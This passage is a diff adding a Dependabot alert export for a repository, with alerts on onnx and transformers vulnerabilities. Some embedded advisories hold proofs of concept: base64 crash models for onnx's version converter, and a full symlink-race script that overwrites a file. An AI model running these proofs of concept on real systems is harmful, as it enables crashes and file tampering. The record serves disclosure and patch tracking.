@@ -1,0 +1,1512 @@
+[
+    {
+        "number": 14,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "manifest_path": "uv.lock",
+            "scope": "runtime",
+            "relationship": "direct"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-p893-rvq9-2xf9",
+            "cve_id": "CVE-2026-63632",
+            "summary": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+            "description": "### Summary\n\nHeap-buffer-overflow READ (16 bytes) in `Gemm_7_6::adapt_gemm_7_6()` (`onnx/version_converter/adapters/gemm_7_6.h:41`) when `ConvertVersion()` processes a model with a Gemm node whose input tensors have fewer than 2 dimensions. The adapter accesses `B_shape[1]` without checking rank. On Release builds the OOB read is silent; ASan confirms 16-byte read past a 48-byte allocation.\n\n### Details\n\nThe Gemm 7→6 downgrade adapter reads input shapes without bounds checking:\n```cpp\n// gemm_7_6.h:26-42\nconst auto& A_shape = inputs[0]->sizes();  // May have < 2 elements\nconst auto& B_shape = inputs[1]->sizes();  // May have < 2 elements\n\nif (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension). `B_shape` has 1 element. Accessing `B_shape[1]` reads 16 bytes past the `std::vector<Dimension>` internal storage into adjacent heap memory.\n\nThe same unchecked pattern applies to `A_shape[0]` and `A_shape[1]` at lines 34 and 36.\n\n**Entry point:** `onnx.version_converter.convert_version(model, 6)` — different from the `InferShapes` bugs reported in separate advisories. This triggers during opset downgrade (7→6).\n\n### PoC\n```python\nimport base64\nimport onnx\nfrom onnx import version_converter\n\npoc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))\n\n# Triggers heap-buffer-overflow in Gemm_7_6 adapter\nversion_converter.convert_version(model, 6)\n```\n\n186-byte PoC. ASan confirms: `heap-buffer-overflow READ of size 16` at `gemm_7_6.h:41`, `0 bytes after 48-byte region` allocated in `tensorShapeProtoToDimensions` at `ir_pb_converter.cc:216`.\n\n### Impact\n\nAny application that uses `onnx.version_converter.convert_version()` on untrusted models is vulnerable. This includes model conversion pipelines and tools that auto-downgrade opset versions for compatibility. On Release builds the OOB read is silent — the read value propagates into the converted model's output shape, potentially leaking heap data. On ASan builds it's detected as a heap-buffer-overflow. Could also cause crashes with different heap layouts.",
+            "severity": "low",
+            "identifiers": [
+                {
+                    "value": "GHSA-p893-rvq9-2xf9",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-63632",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/onnx/onnx/security/advisories/GHSA-p893-rvq9-2xf9"
+                },
+                {
+                    "url": "https://github.com/onnx/onnx/pull/7880"
+                },
+                {
+                    "url": "https://github.com/onnx/onnx/commit/e9c74f596eaa0250f89e52a54160a25bbcb25b66"
+                },
+                {
+                    "url": "https://github.com/onnx/onnx/releases/tag/v1.22.0"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9"
+                }
+            ],
+            "published_at": "2026-07-24T15:48:04Z",
+            "updated_at": "2026-07-24T15:48:05Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "onnx"
+                    },
+                    "severity": "low",
+                    "vulnerable_version_range": ">= 1.3.0, <= 1.21.0",
+                    "first_patched_version": {
+                        "identifier": "1.22.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L",
+                    "score": 3.3
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L",
+                "score": 3.3
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-125",
+                    "name": "Out-of-bounds Read"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "severity": "low",
+            "vulnerable_version_range": ">= 1.3.0, <= 1.21.0",
+            "first_patched_version": {
+                "identifier": "1.22.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pytorch_geometric/dependabot/alerts/14",
+        "html_url": "https://github.com/fcas/pytorch_geometric/security/dependabot/14",
+        "created_at": "2026-08-14T19:15:19Z",
+        "updated_at": "2026-08-16T01:23:55Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-16T01:23:55Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 13,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "manifest_path": "uv.lock",
+            "scope": "runtime",
+            "relationship": "direct"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-fgcw-684q-jj6r",
+            "cve_id": "CVE-2026-5241",
+            "summary": "huggingface/transformers: Arbitrary Code Execution During Model Initialization in the LightGlue Model Loading Path",
+            "description": "A vulnerability in the LightGlue model loading path of huggingface/transformers version 5.2.0 allows an attacker-controlled model repository to execute arbitrary code during model initialization. The issue arises because the `trust_remote_code` parameter, intended to prevent remote code execution, is overridden by untrusted serialized configuration data in a nested code path. Specifically, when loading a LightGlue model using `AutoModel.from_pretrained()` with `trust_remote_code=False`, the `LightGlueConfig` reads the `trust_remote_code` value from the untrusted `config.json` file and propagates it into nested `AutoConfig.from_pretrained()` calls. This results in the execution of attacker-provided Python modules, even when the victim explicitly disables remote code execution. The vulnerability poses a high risk for environments such as API inference servers, research notebooks, CI/CD pipelines, and model evaluation workers, potentially leading to credential theft, lateral movement, or persistence/backdoor deployment.",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-fgcw-684q-jj6r",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-5241",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-5241"
+                },
+                {
+                    "url": "https://github.com/huggingface/transformers/commit/676559d5022b74aaa0cee1cee0842b7f27c5320e"
+                },
+                {
+                    "url": "https://huntr.com/bounties/ceb3ce1a-4c45-497a-b25e-cb9a7685e619"
+                },
+                {
+                    "url": "https://access.redhat.com/security/cve/CVE-2026-5241"
+                },
+                {
+                    "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2484384"
+                },
+                {
+                    "url": "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-5241.json"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:34456"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:37275"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/transformers/PYSEC-2026-2290.yaml"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:42644"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-fgcw-684q-jj6r"
+                }
+            ],
+            "published_at": "2026-06-03T15:30:43Z",
+            "updated_at": "2026-07-21T12:33:27Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "transformers"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 5.5.0",
+                    "first_patched_version": {
+                        "identifier": "5.5.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N",
+                    "score": 8.0
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00547,
+                "percentile": 0.42526
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N",
+                "score": 8.0
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-829",
+                    "name": "Inclusion of Functionality from Untrusted Control Sphere"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 5.5.0",
+            "first_patched_version": {
+                "identifier": "5.5.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pytorch_geometric/dependabot/alerts/13",
+        "html_url": "https://github.com/fcas/pytorch_geometric/security/dependabot/13",
+        "created_at": "2026-08-14T19:15:19Z",
+        "updated_at": "2026-08-16T01:23:55Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-16T01:23:55Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 12,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "manifest_path": "uv.lock",
+            "scope": "runtime",
+            "relationship": "direct"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-hwpq-hmq9-wj77",
+            "cve_id": "CVE-2026-44512",
+            "summary": "ONNX has Null Pointer Dereference in Upsample Version Converter Adapter (Zero Inputs)",
+            "description": "### Summary\n\nNull pointer dereference (SIGSEGV) in `Upsample_6_7::adapt_upsample_6_7()` (`onnx/version_converter/adapters/upsample_6_7.h:31`) when `convert_version()` processes a model with an Upsample node that has zero inputs. The adapter accesses `node->inputs()[0]->sizes()` without checking input count. 107-byte PoC crashes on Release build.\n\nThis is the same class of bug as the Cast adapter advisory (separate report) but in a different adapter, different file, and different operator.\n\n### Details\n\nThe Upsample 6→7 adapter validates attributes but not inputs:\n```cpp\n// upsample_6_7.h:20-33\nvoid adapt_upsample_6_7(..., Node* node) const {\n    ONNX_ASSERTM(\n        node->hasAttribute(width_scale_symbol) && node->hasAttribute(height_scale_symbol),\n        \"...\")  // Attribute check PASSES\n\n    auto width_scale = node->f(width_scale_symbol);\n    auto height_scale = node->f(height_scale_symbol);\n\n    auto input_shape = node->inputs()[0]->sizes();\n    //                 ^^^^^^^^^^^^^^^^^^^^\n    //                 OOB when inputs().size() == 0 → SIGSEGV\n}\n```\n\nThe PoC has an Upsample node at opset 6 with the required `width_scale` and `height_scale` attributes but zero inputs. The attribute assertions pass, then `node->inputs()[0]` on an empty `ArrayRef`:\n- Release builds (`NDEBUG`): bounds-check assertion compiled out → reads garbage pointer → SIGSEGV\n- Debug builds: `assert(Index < Length)` at `array_ref.h:159` → SIGABRT\n\nAn Upsample node with zero inputs passes `graphProtoToGraph()` because the import code only resolves input names present in the protobuf.\n\n### PoC\n```python\nimport base64\nimport onnx\nfrom onnx import version_converter\n\npoc_b64 = \"CAI6YQo8EgFZIghVcHNhbXBsZSoVCgt3aWR0aF9zY2FsZRUAAABAoAEBKhYKDGhlaWdodF9zY2FsZRUAAABAoAEBEgR0ZXN0YhsKAVkSFgoUCAESEAoCCAEKAggBCgIIBAoCCARCBAoAEAY=\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))\n\n# CRASHES — Upsample_6_7 adapter dereferences empty inputs array\nversion_converter.convert_version(model, 7)  # SIGSEGV\n```\n\n107-byte PoC. Confirmed SIGSEGV on both onnx 1.21.0 (pip) and 1.22.0 (source build).\n\n### Impact\n\nAny application that uses `onnx.version_converter.convert_version()` on untrusted models is vulnerable. This includes model conversion pipelines and tools that auto-upgrade opset versions for compatibility. The crash is unrecoverable (SIGSEGV). \n\nThis vulnerability is part of a systemic pattern across multiple version converter adapters. A full audit of all ~45 adapters was performed as part of the fix; eight adapters were found with the same class of unguarded indexed access (cast_9_8, softmax_12_13, softmax_13_12, upsample_6_7, upsample_9_10, group_normalization_20_21, broadcast_forward_compatibility, upsample_9_8) and all have been fixed in PR #7813.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-hwpq-hmq9-wj77",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-44512",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/onnx/onnx/security/advisories/GHSA-hwpq-hmq9-wj77"
+                },
+                {
+                    "url": "https://github.com/onnx/onnx/pull/7916"
+                },
+                {
+                    "url": "https://github.com/onnx/onnx/releases/tag/v1.22.0"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-hwpq-hmq9-wj77"
+                }
+            ],
+            "published_at": "2026-07-07T13:02:10Z",
+            "updated_at": "2026-07-07T13:02:12Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "onnx"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": ">= 1.9.0, < 1.22.0",
+                    "first_patched_version": {
+                        "identifier": "1.22.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+                    "score": 5.5
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00183,
+                "percentile": 0.08166
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+                "score": 5.5
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-476",
+                    "name": "NULL Pointer Dereference"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": ">= 1.9.0, < 1.22.0",
+            "first_patched_version": {
+                "identifier": "1.22.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pytorch_geometric/dependabot/alerts/12",
+        "html_url": "https://github.com/fcas/pytorch_geometric/security/dependabot/12",
+        "created_at": "2026-08-14T19:15:18Z",
+        "updated_at": "2026-08-16T01:23:55Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-16T01:23:55Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 11,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "manifest_path": "uv.lock",
+            "scope": "runtime",
+            "relationship": "direct"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-29pf-2h5f-8g72",
+            "cve_id": "CVE-2026-4372",
+            "summary": "HuggingFace transformers vulnerable to remote code execution",
+            "description": "A critical remote code execution vulnerability exists in all versions of the HuggingFace transformers library prior to version 5.3.0. The vulnerability allows an attacker to craft a malicious `config.json` file containing the `_attn_implementation_internal` field set to an attacker-controlled HuggingFace Hub repository ID. When a victim loads this model using the standard `AutoModelForCausalLM.from_pretrained()` API, the library downloads and executes arbitrary Python code from the attacker's repository with the victim's full OS privileges. This issue arises due to unfiltered deserialization of configuration attributes, insufficient sanitization of internal fields, and unsandboxed execution of downloaded kernels. The vulnerability bypasses the `trust_remote_code` security mechanism, is invisible to the victim, and exploits the standard documented usage pattern, making it particularly severe. Users are advised to upgrade to version 5.3.0 or later to mitigate this issue.",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-29pf-2h5f-8g72",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-4372",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-4372"
+                },
+                {
+                    "url": "https://github.com/huggingface/transformers/commit/a7f8e7ff37d87d1a1a0c8cf607971c607741452f"
+                },
+                {
+                    "url": "https://huntr.com/bounties/1f693a6e-6836-4b8b-a0bd-ca036fba8884"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-29pf-2h5f-8g72"
+                }
+            ],
+            "published_at": "2026-05-26T13:30:33Z",
+            "updated_at": "2026-07-01T18:00:11Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "transformers"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 5.3.0",
+                    "first_patched_version": {
+                        "identifier": "5.3.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+                    "score": 7.8
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00479,
+                "percentile": 0.3852
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+                "score": 7.8
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-502",
+                    "name": "Deserialization of Untrusted Data"
+                },
+                {
+                    "cwe_id": "CWE-1066",
+                    "name": "Missing Serialization Control Element"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 5.3.0",
+            "first_patched_version": {
+                "identifier": "5.3.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pytorch_geometric/dependabot/alerts/11",
+        "html_url": "https://github.com/fcas/pytorch_geometric/security/dependabot/11",
+        "created_at": "2026-08-14T19:15:18Z",
+        "updated_at": "2026-08-16T01:23:55Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-16T01:23:55Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 10,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "manifest_path": "uv.lock",
+            "scope": "runtime",
+            "relationship": "direct"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-69w3-r845-3855",
+            "cve_id": "CVE-2026-1839",
+            "summary": "HuggingFace Transformers allows for arbitrary code execution in the `Trainer` class",
+            "description": "A vulnerability in the HuggingFace Transformers library, specifically in the `Trainer` class, allows for arbitrary code execution. The `_load_rng_state()` method in `src/transformers/trainer.py` at line 3059 calls `torch.load()` without the `weights_only=True` parameter. This issue affects all versions of the library supporting `torch>=2.2` when used with PyTorch versions below 2.6, as the `safe_globals()` context manager provides no protection in these versions. An attacker can exploit this vulnerability by supplying a malicious checkpoint file, such as `rng_state.pth`, which can execute arbitrary code when loaded. The issue is resolved in version v5.0.0rc3.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-69w3-r845-3855",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-1839",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-1839"
+                },
+                {
+                    "url": "https://github.com/huggingface/transformers/commit/03c8082ba4594c9b8d6fe190ca9bed0e5f8ca396"
+                },
+                {
+                    "url": "https://huntr.com/bounties/3c77bb97-e493-493d-9a88-c57f5c536485"
+                },
+                {
+                    "url": "https://github.com/huggingface/transformers/releases/tag/v5.0.0rc3"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-69w3-r845-3855"
+                }
+            ],
+            "published_at": "2026-04-07T06:30:28Z",
+            "updated_at": "2026-04-08T00:17:59Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "transformers"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "< 5.0.0rc3",
+                    "first_patched_version": {
+                        "identifier": "5.0.0rc3"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.0/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:H",
+                    "score": 6.5
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00349,
+                "percentile": 0.27503
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:H",
+                "score": 6.5
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-502",
+                    "name": "Deserialization of Untrusted Data"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "transformers"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "< 5.0.0rc3",
+            "first_patched_version": {
+                "identifier": "5.0.0rc3"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pytorch_geometric/dependabot/alerts/10",
+        "html_url": "https://github.com/fcas/pytorch_geometric/security/dependabot/10",
+        "created_at": "2026-08-14T19:15:18Z",
+        "updated_at": "2026-08-16T01:23:55Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-16T01:23:55Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 9,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "manifest_path": "uv.lock",
+            "scope": "runtime",
+            "relationship": "direct"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-q56x-g2fj-4rj6",
+            "cve_id": null,
+            "summary": "ONNX: TOCTOU arbitrary file read/write in save_external_dat ",
+            "description": "### Summary\n\nThe `save_external_data` method seems to include multiple issues introducing a local TOCTOU vulnerability, an arbitrary file read/write on any system. It potentially includes a path validation bypass on Windows systems.\nRegarding the TOCTOU, an attacker seems to be able to overwrite victim's files via symlink following under the same privilege scope.\nThe mentioned function can be found here: https://github.com/onnx/onnx/blob/main/onnx/external_data_helper.py#L188\n\n### Details\n\n#### Toctou\nThe vulnerable code pattern:\n```python\n   # CHECK - Is this a file?\n   if not os.path.isfile(external_data_file_path):\n       # Line 228-229: USE #1 - Create if it doesn't exist\n       with open(external_data_file_path, \"ab\"):\n           pass\n   \n   # Open for writing\n   with open(external_data_file_path, \"r+b\") as data_file:\n       # Lines 233-243: Write tensor data\n       data_file.seek(0, 2)\n       if info.offset is not None:\n           file_size = data_file.tell()\n           if info.offset > file_size:\n               data_file.write(b\"\\0\" * (info.offset - file_size))\n           data_file.seek(info.offset)\n       offset = data_file.tell()\n       data_file.write(tensor.raw_data)\n```\nThere is a time gap between `os.path.isfile` and `open` with no atomic file creation flags (e.g. `O_EXCEL | O_CREAT`) allowing the attacker to create a symlink that is being followed (absence of `O_NOFOLLOW`), between these two calls. By combining these, the attack is possible as shown below in the PoC section.\n\n#### Bypass\nThere is also a potential validation bypass on Windows systems in the same method (https://github.com/onnx/onnx/blob/main/onnx/external_data_helper.py#L203) allowing absolute paths like `C:\\` (only 1 part):\n```python\nif location_path.is_absolute() and len(location_path.parts) > 1\n```\nThis may allow Windows Path Traversals (not 100% verified as I am emulating things on a Debian distro).\n\n### PoC\n\nInstall the dependencies and run this:\n```python\nimport os\nimport sys\nimport tempfile\nimport numpy as np\nimport onnx\nfrom onnx import TensorProto, helper\nfrom onnx.numpy_helper import from_array\n\n# Create a temporary directory for our poc\nwith tempfile.TemporaryDirectory() as tmpdir:\n    print(f\"[*] Working directory: {tmpdir}\")\n\n    # Create a \"sensitive\" file that we'll overwrite\n    sensitive_file = os.path.join(tmpdir, \"sensitive.txt\")\n    with open(sensitive_file, 'w') as f:\n        f.write(\"SENSITIVE DATA - DO NOT OVERWRITE\")\n\n    original_content = open(sensitive_file, 'rb').read()\n    print(f\"[*] Created sensitive file: {sensitive_file}\")\n    print(f\"    Original content: {original_content}\")\n\n    # Create a simple ONNX model with a large tensor\n    print(\"[*] Creating ONNX model with external data...\")\n\n    # Create a tensor with data > 1KB (to trigger external data)\n    large_array = np.ones((100, 100), dtype=np.float32)  # 40KB tensor\n    large_tensor = from_array(large_array, name='large_weight')\n\n    # Create a minimal model\n    model = helper.make_model(\n        helper.make_graph(\n            [helper.make_node('Identity', ['input'], ['output'])],\n            'minimal_model',\n            [helper.make_tensor_value_info('input', TensorProto.FLOAT, [100, 100])],\n            [helper.make_tensor_value_info('output', TensorProto.FLOAT, [100, 100])],\n            [large_tensor]\n        )\n    )\n\n    # Save model with external data to create the external data file\n    model_path = os.path.join(tmpdir, \"model.onnx\")\n    external_data_name = \"data.bin\"\n    external_data_path = os.path.join(tmpdir, external_data_name)\n\n    onnx.save_model(\n        model, \n        model_path,\n        save_as_external_data=True,\n        all_tensors_to_one_file=True,\n        location=external_data_name,\n        size_threshold=1024\n    )\n\n    print(f\"[+] Model saved: {model_path}\")\n    print(f\"[+] External data created: {external_data_path}\")\n\n    # Now comes the attack: replace the external data file with a symlink\n    print(\"[!] ATTACK: Replacing external data file with symlink...\")\n\n    # Remove the legitimate external data file\n    if os.path.exists(external_data_path):\n        os.remove(external_data_path)\n        print(f\"    Removed: {external_data_path}\")\n\n    # Create symlink pointing to sensitive file\n    os.symlink(sensitive_file, external_data_path)\n    print(f\"    Created symlink: {external_data_path} -> {sensitive_file}\")\n\n    # Now load and re-save the model, which will trigger the vulnerability\n    print(\"Loading model and saving with external data...\")\n    try:\n        # Load the model (without loading external data)\n        loaded_model = onnx.load(model_path, load_external_data=False)\n\n        # Modify the model slightly (to ensure we write new data)\n        loaded_model.graph.initializer[0].raw_data = large_array.tobytes()\n\n        # Save again - this will call save_external_data() and follow the symlink\n        onnx.save_model(\n            loaded_model,\n            model_path,\n            save_as_external_data=True,\n            all_tensors_to_one_file=True,\n            location=external_data_name,\n            size_threshold=1024\n        )\n    except Exception as e:\n        print(f\"[-] Error: {e}\")\n    \n    # Check if the sensitive file was overwritten\n    print(\"[*] Checking if sensitive file was modified...\")\n    modified_content = open(sensitive_file, 'rb').read()\n    \n    print(f\"    Original size: {len(original_content)} bytes\")\n    print(f\"    Current size:  {len(modified_content)} bytes\")\n    print(f\"    Original content: {original_content[:50]}\")\n    print(f\"    Current content:  {modified_content[:50]}...\")\n    print()\n    \n    if modified_content != original_content:\n        print(\"[!] Success!\")\n    else:\n        print(\"[-] Failure\")\n```\nOutput:\n```\n[*] Working directory: /tmp/tmpqy7z88_l\n[*] Created sensitive file: /tmp/tmpqy7z88_l/sensitive.txt\n    Original content: b'SENSITIVE DATA - DO NOT OVERWRITE'\n\n[*] Creating ONNX model with external data...\n[+] Model saved: /tmp/tmpqy7z88_l/model.onnx\n[+] External data created: /tmp/tmpqy7z88_l/data.bin\n[!] ATTACK: Replacing external data file with symlink...\n    Removed: /tmp/tmpqy7z88_l/data.bin\n    Created symlink: /tmp/tmpqy7z88_l/data.bin -> /tmp/tmpqy7z88_l/sensitive.txt\nLoading model and saving with external data...\n[*] Checking if sensitive file was modified...\n    Original size: 33 bytes\n    Current size:  40033 bytes\n    Original content: b'SENSITIVE DATA - DO NOT OVERWRITE'\n    Current content:  b'SENSITIVE DATA - DO NOT OVERWRITE\\x00\\x00\\x80?\\x00\\x00\\x80?\\x00\\x00\\x80?\\x00\\x00\\x80?\\x00'...\n```\nSuccessfully overwritting the \"sensitive data\" file.\n\n### Impact\nThe impact may include filesystem injections (e.g. on ssh keys, shell configs, crons) or destruction of files, affecting integrity and availability.\n\n### Mitigations\n1. Atomic file creation\n2. Symlink protection\n3. Path canonicalization",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-q56x-g2fj-4rj6",
+                    "type": "GHSA"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/onnx/onnx/security/advisories/GHSA-q56x-g2fj-4rj6"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-q56x-g2fj-4rj6"
+                }
+            ],
+            "published_at": "2026-04-01T23:40:58Z",
+            "updated_at": "2026-06-08T20:15:32Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "onnx"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "<= 1.20.1",
+                    "first_patched_version": {
+                        "identifier": "1.21.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H",
+                    "score": 7.1
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H",
+                "score": 7.1
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-22",
